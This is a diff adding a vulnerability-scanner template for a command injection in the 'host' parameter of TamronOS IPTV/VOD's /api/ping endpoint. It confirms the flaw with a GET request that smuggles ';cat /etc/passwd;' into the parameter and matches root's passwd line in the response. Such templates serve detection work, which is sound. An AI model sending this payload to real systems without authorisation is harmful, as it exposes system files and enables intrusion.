@@ -1,0 +1,21 @@
+id: tamronos-rce
+name: TamronOS IPTV/VOD - Remote Command Execution
+severity: critical
+confidence: confirmed
+description: TamronOS IPTV/VOD contains a remote command execution in the 'host' parameter of the /api/ping endpoint.
+reference: CWE-78
+tags:
+- tamronos
+- rce
+- vuln
+requests:
+- method: GET
+  path: /api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  condition: and
